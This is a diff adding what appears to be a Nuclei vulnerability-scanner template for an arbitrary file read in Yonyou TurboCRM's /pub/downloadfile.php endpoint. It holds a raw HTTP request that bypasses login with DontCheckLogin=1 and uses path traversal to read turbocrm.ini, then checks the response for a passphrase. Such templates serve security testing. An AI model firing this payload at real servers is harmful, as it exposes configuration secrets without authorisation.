@@ -1,0 +1,15 @@
+http:
+    - matchers:
+        - dsl:
+            - status_code==200 && contains(body,"IOSPushPassphrase")
+          type: dsl
+      raw:
+        - |
+          GET /pub/downloadfile.php?DontCheckLogin=1&url=/datacache/../../../tsvr/turbocrm.ini HTTP/1.1
+          Host: {{Hostname}}
+id: yonyou-turbo-crm-downloadfile-fileread
+info:
+    author: SleepingBag945
+    name: 用友 TurboCRM /pub/downloadfile.php 接口任意文件读取
+    severity: high
+    tags: []
